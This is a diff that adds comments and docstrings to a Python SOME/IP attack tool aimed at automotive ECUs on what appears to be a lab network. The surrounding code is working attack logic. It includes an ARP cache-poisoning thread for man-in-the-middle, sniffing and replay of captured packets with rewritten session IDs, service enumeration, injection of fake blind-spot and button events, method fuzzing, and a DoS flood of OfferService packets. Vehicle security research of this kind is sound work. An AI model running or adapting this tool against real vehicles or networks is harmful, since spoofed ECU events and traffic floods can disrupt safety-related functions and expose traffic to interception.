@@ -1,6 +1,13 @@
 """
 someip_attacker.py
 SOME/IP (IPv4) attack logic + MAC Spoofing/Sniffing.
+
+This module implements the offensive capabilities against the SOME/IP stack, including:
+1. Service Enumeration (Active Probing)
+2. Event Impersonation (Spoofing)
+3. Method Fuzzing
+4. DoS Attacks
+5. MAC/ARP Spoofing using Scapy
 """
 import asyncio
 import ipaddress
@@ -17,6 +24,7 @@ from typing import Set, List
 # Scapy imports from att_macspoof
 from scapy.all import *
 
+# Third-party SOME/IP library imports
 from someipy import (
     TransportLayerProtocol,
     ServiceBuilder,
@@ -28,22 +36,32 @@ from someipy.server_service_instance import construct_server_service_instance
 from someipy.client_service_instance import construct_client_service_instance
 from someipy.logging import set_someipy_log_level
 
+# Import global attack configuration (IPs, Ports, Interface)
 from attack_config import *
 
-# Suppress Scapy warnings
+# Suppress Scapy warnings to keep the console clean
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
 # ==========================================
 # LOGGING FILTERS (To Fix Console Spam)
 # ==========================================
 class BlockSomeIPConsole(logging.Filter):
+    """
+    Filter to block standard console output from the someipy library.
+    This prevents the attack menu from being flooded with library debug logs.
+    """
     def filter(self, record):
         return not record.name.startswith('someipy')
 
 class SubscriptionHandler(logging.Handler):
+    """
+    Custom logging handler to intercept 'Subscription' messages internally.
+    Used during Service Enumeration to detect when an ECU accepts our service offer.
+    """
     def __init__(self):
         super().__init__()
         self.subscribed: Set[int] = set()
+        # Regex to extract Service ID from the log message indicating a successful subscription
         self.pattern = re.compile(r'Received subscribe for .* service (0x[0-9a-fA-F]+)')
 
     def emit(self, record):
@@ -51,18 +69,24 @@ class SubscriptionHandler(logging.Handler):
             msg = record.getMessage()
             match = self.pattern.search(msg)
             if match:
+                # If we see a subscription log, parse the Service ID and add to set
                 sid = int(match.group(1), 16)
                 self.subscribed.add(sid)
         except:
             pass
 
     def clear(self):
+        """Reset the set of discovered subscriptions."""
         self.subscribed.clear()
 
 # ==========================================
 # MAIN CLASS
 # ==========================================
 class SomeIPAttacker:
+    """
+    Main class controlling SOME/IP attacks (IPv4).
+    Integrates both high-level asyncio attacks (someipy) and low-level packet manipulation (Scapy).
+    """
     def __init__(self):
         # SOME/IP State
         self.discovered_services: Set[int] = set()
@@ -72,12 +96,18 @@ class SomeIPAttacker:
         self.mac_stop_event = threading.Event()
         self.mac_all_seen_hashes = set()
         self.mac_all_packets = []
+        
+        # Configuration for capture files and network targets
+        # [CONFIGURABLE] Default capture filename
         self.MAC_PCAP_FILE = "attack_capture.pcap"
+        # [CONFIGURABLE] SOME/IP SD Multicast Group
         self.MCAST_GROUP = "224.224.224.245"
+        # [CONFIGURABLE] Target ECUs
         self.ECU1_IP = "192.168.42.10"
         self.ECU2_IP = "192.168.42.20"
 
     def print_menu(self):
+        """Display the text-based menu for SOME/IP attacks."""
         print("\n[SOME/IP Main Menu]")
         print("1. Enumerate Services (Active Probing)")
         print("2. Impersonate Service (Fake Events)")
@@ -88,6 +118,7 @@ class SomeIPAttacker:
         print("-" * 70)
 
     def print_banner(self):
+        """Display the current status and discovered services."""
         print("\n" + "=" * 70)
         print("         SOME/IP ACTIVE ATTACKER (IPv4)")
         print("=" * 70)
@@ -101,6 +132,7 @@ class SomeIPAttacker:
     # ATT_MACSPOOF INTEGRATION (Methods)
     # ==========================================
     def mac_load_existing(self):
+        """Loads previously captured packets from PCAP file to avoid duplicates."""
         if os.path.exists(self.MAC_PCAP_FILE):
             try:
                 existing = rdpcap(self.MAC_PCAP_FILE)
@@ -114,6 +146,10 @@ class SomeIPAttacker:
                 print(f"{Colors.R}[-] Could not read old file: {e}{Colors.W}")
 
     def mac_live_callback(self, pkt):
+        """
+        Callback function for Scapy sniff().
+        Processes every captured packet to display SOME/IP details in real-time.
+        """
         h = hash(bytes(pkt))
         if h not in self.mac_all_seen_hashes:
             self.mac_all_seen_hashes.add(h)
@@ -128,11 +164,13 @@ class SomeIPAttacker:
             payload = bytes(pkt[UDP].payload)
             if len(payload) < 8: return
 
+            # Extract SOME/IP Header Fields manually
             msg_id = struct.unpack_from("!I", payload, 0)[0]
             service_id = msg_id >> 16
             method_id = msg_id & 0xFFFF
             is_request = (payload[4] & 0x80) == 0
 
+            # Color-coded output based on traffic type
             if dport == 30490:
                 print(f"{Colors.Y}[SD]       {Colors.W}{src} → {dst}")
             elif src == self.ECU1_IP and dport == 3001:
@@ -144,6 +182,7 @@ class SomeIPAttacker:
                 print(f"{Colors.C}[DATA]     {Colors.W}{src}:{sport} → {dst}:{dport}  {req}  Svc=0x{service_id:04X}  Mtd=0x{method_id:04X}")
 
     def mac_get_victim_mac(self, ip):
+        """Resolves MAC address for a given IP using ARP."""
         try:
             mac = getmacbyip(ip)
             return mac if mac else "ff:ff:ff:ff:ff:ff"
@@ -151,21 +190,27 @@ class SomeIPAttacker:
             return "ff:ff:ff:ff:ff:ff"
 
     def mac_arp_spoof_thread(self, target_ip, victim_ip):
+        """
+        Background thread that continuously sends forged ARP replies.
+        Performs Man-in-the-Middle (MitM) by poisoning the ARP cache.
+        """
         victim_mac = self.mac_get_victim_mac(victim_ip)
         print(f"{Colors.Y}[SPOOF] {target_ip} → poisoning {victim_ip}{Colors.W}")
         try:
             while not self.mac_stop_event.is_set():
                 try:
+                    # Send ARP Reply: "Target IP is at Attacker MAC"
                     send(ARP(op=2, psrc=target_ip, pdst=victim_ip,
                              hwdst=victim_mac, hwsrc=ATTACKER_MAC),
                          verbose=0, iface=INTERFACE)
                 except:
                     pass
-                time.sleep(3)
+                time.sleep(3) # [CONFIGURABLE] ARP Spoofing Interval
         finally:
             print(f"{Colors.Y}[*] ARP spoofing thread stopped{Colors.W}")
 
     def mac_impersonate_and_sniff(self):
+        """Menu option 5.1: Setup ARP Spoofing and sniff traffic."""
         print(f"\n{Colors.C}Which ECU to impersonate?{Colors.W}")
         print(" 1. ECU1 - Mirror (192.168.42.10)")
         print(" 2. ECU2 - Buttons (192.168.42.20)")
@@ -178,10 +223,11 @@ class SomeIPAttacker:
             print(f"{Colors.R}Invalid{Colors.W}")
             return
 
-        duration = 15
+        duration = 15 # [CONFIGURABLE] Sniff duration in seconds
         print(f"\n{Colors.G}[+] Impersonating {name} ECU for {duration}s{Colors.W}")
 
         self.mac_stop_event.clear()
+        # Start the ARP poisoning in background
         spoof_thread = threading.Thread(target=self.mac_arp_spoof_thread, args=(target, victim), daemon=True)
         spoof_thread.start()
 
@@ -200,6 +246,7 @@ class SomeIPAttacker:
         print(f"{Colors.G}[+] Saved → {os.path.abspath(self.MAC_PCAP_FILE)}{Colors.W}")
 
     def mac_list_mode(self):
+        """Menu option 5.2: Display captured packets in a table."""
         if not os.path.exists(self.MAC_PCAP_FILE):
             print(f"{Colors.R}[-] No capture yet — run attack first{Colors.W}")
             return
@@ -232,6 +279,7 @@ class SomeIPAttacker:
         print("─" * 98)
 
     def mac_replay_mode(self):
+        """Menu option 5.3: Replay selected packets from the capture."""
         if not os.path.exists(self.MAC_PCAP_FILE):
             print(f"{Colors.R}[-] No capture file. Run sniff first.{Colors.W}")
             return
@@ -311,6 +359,7 @@ class SomeIPAttacker:
                     continue
 
                 if len(data) >= 12:
+                    # Update Session ID in SOME/IP Header (Bytes 10-12)
                     data[10:12] = new_session.to_bytes(2, 'big')
                     if pkt.haslayer(Raw):
                         pkt[Raw].load = bytes(data)
@@ -349,6 +398,7 @@ class SomeIPAttacker:
         print(f"{Colors.G}[+] REPLAY COMPLETE{Colors.W}")
 
     def mac_spoof_menu(self):
+        """Displays the sub-menu for Scapy-based attacks."""
         self.mac_load_existing()
         while True:
             print(f"\n{Colors.C}{Colors.BOLD}╔{'═'*64}╗")
@@ -371,6 +421,11 @@ class SomeIPAttacker:
     # SOME/IP ASYNC METHODS
     # ==========================================
     async def enumerate_services(self, sd) -> None:
+        """
+        Active Probing Attack.
+        Iterates through a range of Service IDs, offering each one.
+        If an ECU subscribes to it, we know that Service ID is valid/used by that ECU.
+        """
         print("\n[+] Active Service Enumeration")
         try:
             start_hex = await ainput("    Start Service ID (hex): ")
@@ -391,9 +446,11 @@ class SomeIPAttacker:
         for sid in range(start, end + 1):
             print(f"    Offering 0x{sid:04X}... ({sid - start + 1}/{total})", end="\r")
 
+            # Construct a fake service definition
             service = ServiceBuilder().with_service_id(sid).with_major_version(1).build()
-            port = 3000 + (sid & 0xFFF)
+            port = 3000 + (sid & 0xFFF) # Deterministic port calculation
 
+            # Create server instance to Offer the service
             server = await construct_server_service_instance(
                 service,
                 instance_id=0x0001,
@@ -405,8 +462,10 @@ class SomeIPAttacker:
             sd.attach(server)
             server.start_offer()
 
+            # Wait to see if anyone subscribes
             await asyncio.sleep(PROBE_DURATION)
 
+            # Check our custom logging handler for subscription hits
             if sid in self.handler.subscribed:
                 newly_found.append(sid)
                 self.discovered_services.add(sid)
@@ -418,8 +477,14 @@ class SomeIPAttacker:
         print(f"\n[+] Probe complete. Newly found: {len(newly_found)} | Total: {len(self.discovered_services)}")
 
     async def impersonate_service_someip(self, sd, service_id: int):
+        """
+        Event Spoofing Attack.
+        Offers a valid service and injects fake events to control ECU behavior.
+        Specific logic exists for Blind Spot and Button events.
+        """
         print(f"\n[!] Impersonating Service 0x{service_id:04X} - Sending Fake Events for 10 seconds")
 
+        # Determine payload type based on Service ID
         if service_id == 0x1000:
             event_group_id = 0x8000
             event_id = 0x8001
@@ -436,6 +501,7 @@ class SomeIPAttacker:
             event_id = 0x0001
             payload_type = "generic"
 
+        # Build the malicious service instance
         event_group = EventGroup(id=event_group_id, event_ids=[event_id])
         service = ServiceBuilder() \
             .with_service_id(service_id) \
@@ -460,6 +526,7 @@ class SomeIPAttacker:
         try:
             print("    Starting 10-second attack...\n")
             for i in range(20):
+                # Construct fake payload
                 if payload_type == "button":
                     direction = i % 4
                     payload = direction.to_bytes(1, 'big')
@@ -473,6 +540,7 @@ class SomeIPAttacker:
                     payload = i.to_bytes(4, 'big')
                     print(f"    → Generic event #{i + 1}")
 
+                # Send the malicious event
                 server.send_event(event_group_id, event_id, payload)
                 await asyncio.sleep(0.5)
         except KeyboardInterrupt:
@@ -483,6 +551,11 @@ class SomeIPAttacker:
             print("\n[+] Impersonation attack finished (10 seconds completed).")
 
     async def fuzz_methods(self, sd, service_id: int):
+        """
+        Method Fuzzing Attack.
+        Sends Request messages to a range of Method IDs on a known Service.
+        Identifies valid RPC methods based on Return Codes.
+        """
         print(f"\n[+] Method Fuzzing on Service 0x{service_id:04X}")
         try:
             start_hex = await ainput("    Start Method ID (hex): ")
@@ -496,6 +569,7 @@ class SomeIPAttacker:
         active = []
         client_port = 6000
 
+        # Construct client to send requests
         service_def = ServiceBuilder().with_service_id(service_id).with_major_version(1).build()
         client = await construct_client_service_instance(
             service_def,
@@ -512,10 +586,12 @@ class SomeIPAttacker:
             for mid in range(start, end + 1):
                 print(f"    Testing 0x{mid:04X}...", end="\r")
                 try:
+                    # Send request with empty payload
                     result = await asyncio.wait_for(
                         client.call_method(mid, b'\x00'),
                         timeout=1.0
                     )
+                    # Check return code
                     if result.return_code == ReturnCode.E_OK:
                         print(f"\n    ✓ ACTIVE → 0x{mid:04X}")
                         active.append(mid)
@@ -532,6 +608,11 @@ class SomeIPAttacker:
             print("    " + " ".join(f"0x{m:04X}" for m in active))
 
     async def dos_attacks_someip(self, sd, service_id: int):
+        """
+        DoS Attack.
+        Floods the network with 'Offer Service' packets for a specific Service ID.
+        This can confuse subscribers or overwhelm the network stack.
+        """
         print(f"\n[!] DoS Flood - Aggressive Offer Spam for Service 0x{service_id:04X}")
         print("    20-second timed attack - Overwhelms legitimate offers to redirect/block subscriptions")
         print("    Press Ctrl+C to stop early\n")
@@ -545,7 +626,7 @@ class SomeIPAttacker:
             endpoint=(ipaddress.IPv4Address(ATTACKER_IP4), port),
             ttl=5,
             sd_sender=sd,
-            cyclic_offer_delay_ms=10,
+            cyclic_offer_delay_ms=10, # Very fast offer interval (10ms)
             protocol=TransportLayerProtocol.UDP
         )
         sd.attach(server)
@@ -555,6 +636,7 @@ class SomeIPAttacker:
 
         try:
             while asyncio.get_event_loop().time() - start_time < 20:
+                # Toggle offer rapidly
                 server.start_offer()
                 await asyncio.sleep(0.001)
                 server.stop_offer()
@@ -570,9 +652,14 @@ class SomeIPAttacker:
             print("    Check Wireshark for massive OfferService flood from attacker")
 
     async def run(self):
+        """
+        Main entry point for the SOME/IP Attacker module.
+        Sets up logging, initializes Service Discovery, and runs the menu loop.
+        """
         self.print_banner()
 
         # --- LOGGING FIX (Nuclear Option) ---
+        # We need DEBUG level to capture subscriptions, but we must block it from console.
         set_someipy_log_level(logging.DEBUG)
         # Apply filter to ROOT logger to block console spam
         root_logger = logging.getLogger()
@@ -583,6 +670,7 @@ class SomeIPAttacker:
         logger = logging.getLogger('someipy')
         logger.propagate = False
         
+        # Attach the custom handler to intercept Subscription messages
         sd_logger = logging.getLogger('someipy.service_discovery')
         sd_logger.handlers = []
         sd_logger.propagate = False
